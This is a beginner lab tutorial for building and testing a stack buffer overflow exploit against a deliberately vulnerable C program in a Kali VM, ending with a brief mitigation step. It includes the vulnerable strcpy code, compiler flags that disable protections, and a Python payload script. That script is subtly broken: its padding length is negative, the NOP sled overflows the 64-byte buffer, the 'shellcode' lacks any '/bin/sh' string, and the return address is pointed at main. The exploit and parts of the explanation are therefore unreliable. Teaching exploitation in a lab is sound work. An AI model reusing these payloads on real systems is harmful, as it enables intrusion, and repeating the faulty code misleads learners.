# **Develop and Test Exploits**

**Objective:**  
In this project, you’ll develop a simple buffer overflow exploit in a safe, controlled environment using a virtual machine (VM). You’ll create a vulnerable program in C, analyze it, and then design an exploit to gain unauthorized access. Finally, you’ll learn about mitigation techniques to prevent such vulnerabilities.

---

## **What You’ll Need**

**Prerequisites:**  
- **Basic knowledge of programming**: Familiarity with simple C and Python programs.
- **Understanding of buffer overflow**: Know the basic concept of how buffer overflows can be used to overwrite parts of memory.
- **Computer requirements**: A computer with at least 8GB of RAM and enough storage to run virtual machines.
- **Software**: 
  - [VirtualBox](https://www.virtualbox.org/wiki/Downloads) installed to run VMs.
  - [Kali Linux](https://www.kali.org/downloads/) VM (a common Linux distribution for security testing).

---

## **Step-by-Step Guide**

### **Step 1: Set Up the Development Environment**

1. **Install VirtualBox**:
   - Go to the VirtualBox download page at [https://www.virtualbox.org/wiki/Downloads](https://www.virtualbox.org/wiki/Downloads).
   - Download the installer for your operating system and follow the setup instructions.

2. **Install Kali Linux VM**:
   - Download the Kali Linux VM image file (an `.ova` file) from [https://www.kali.org/downloads/](https://www.kali.org/downloads/).
   - Open VirtualBox, go to `File` -> `Import Appliance`, select the Kali Linux `.ova` file you downloaded, and follow the prompts to complete the import.
   - Once imported, start the Kali Linux VM.

---

### **Step 2: Create a Vulnerable Application**

We’ll write a simple C program with a buffer overflow vulnerability.

1. **Create a Project Directory**:
   - Open the Kali Linux terminal and create a directory for your project.
     ```bash
     mkdir exploit_dev
     cd exploit_dev
     ```

2. **Write the Vulnerable C Program**:
   - Create a file named `vuln.c` using the nano text editor.
     ```bash
     nano vuln.c
     ```
   - Copy and paste the following code into `vuln.c`:
     ```c
     #include <stdio.h>
     #include <string.h>

     void vulnerable_function(char *input) {
       char buffer[64];
       strcpy(buffer, input);  // This line is vulnerable
     }

     int main(int argc, char *argv[]) {
       if (argc != 2) {
         printf("Usage: %s <input>\n", argv[0]);
         return 1;
       }
       vulnerable_function(argv[1]);
       printf("Buffer overflow example\n");
       return 0;
     }
     ```
   - This program copies whatever input you give it into a fixed-size buffer (64 bytes), which is vulnerable to buffer overflow if the input is larger than the buffer size.

3. **Compile the Program**:
   - Compile the program with specific options to disable certain protections, making it easier to exploit:
     ```bash
     gcc -fno-stack-protector -z execstack -o vuln vuln.c
     ```
   - **Explanation**: 
     - `-fno-stack-protector` disables stack protection, which would normally prevent buffer overflows.
     - `-z execstack` allows code execution on the stack, which is typically restricted.

---

### **Step 3: Analyze the Vulnerable Program**

1. **Use `objdump` to Disassemble the Program**:
   - The `objdump` command lets you see the machine code and memory addresses within the program.
     ```bash
     objdump -d vuln | less
     ```
   - **Note**: Look for the `main` function and find the return address, which is the memory location that an attacker might overwrite.

2. **Identify the Return Address**:
   - Scroll through the disassembly to find the address of the `main` function. This is where you’ll redirect the program’s execution in the exploit.

---

### **Step 4: Create the Exploit**

1. **Write the Exploit Script**:
   - Create a new Python script named `exploit.py`:
     ```bash
     nano exploit.py
     ```
   - Paste the following code into `exploit.py`:
     ```python
     import struct

     # Replace this with the actual return address you identified
     ret_address = struct.pack("<I", 0x080484cb)  # Example address; use your own

     # NOP sled: sequence of "no operation" instructions to safely guide the program to the payload
     nop_sled = b"\x90" * 100

     # Shellcode to open a command shell (for Linux/x86 systems)
     shellcode = (
       b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
       b"\xb0\x0b\xcd\x80"
     )

     # Padding to fill the buffer up to the return address
     padding = b"A" * (64 - len(nop_sled) - len(shellcode))

     # Construct the payload by combining all parts
     payload = nop_sled + shellcode + padding + ret_address

     # Save the payload to a file for easy access
     with open("payload", "wb") as f:
       f.write(payload)
     ```

   - **Explanation**:
     - The exploit script constructs a payload that includes a **NOP sled** (a sequence of no-operation instructions), **shellcode** to open a command shell, and padding to overwrite the return address with your chosen memory address.

2. **Generate the Payload**:
   - Run the script to create the payload file.
     ```bash
     python3 exploit.py
     ```

---

### **Step 5: Test the Exploit**

1. **Run the Vulnerable Program with the Payload**:
   - Run the vulnerable program, providing the payload file as input:
     ```bash
     ./vuln $(cat payload)
     ```

2. **Verify the Exploit’s Success**:
   - If the exploit worked, you should have a command shell. Test by typing simple commands like `whoami` or `pwd` to confirm.

---

### **Step 6: Mitigate the Vulnerability**

1. **Enable Stack Protection**:
   - Recompile the vulnerable program, this time with stack protection enabled:
     ```bash
     gcc -o vuln vuln.c
     ```

2. **Test the Mitigation**:
   - Run the exploit again with the recompiled program and verify that it fails. Stack protection should prevent buffer overflows from executing malicious code.

---

### **Step 7: Document Your Findings**

1. **Exploit Development**:
   - Write down each step you took to create and test the exploit, including any code you wrote and addresses used.

2. **Mitigation Steps**:
   - Describe the actions taken to secure the program, such as enabling stack protection.

3. **Results Summary**:
   - Summarize the outcomes of the exploit development and testing, including screenshots of terminal outputs or commands that show success/failure.

---

### **Conclusion**

Congratulations! You’ve successfully created and tested a basic buffer overflow exploit in a safe environment. This exercise highlights the importance of secure coding practices and shows how security measures, like stack protection, can prevent buffer overflow attacks. Keep exploring and practicing to deepen your understanding of vulnerabilities and protective coding techniques.
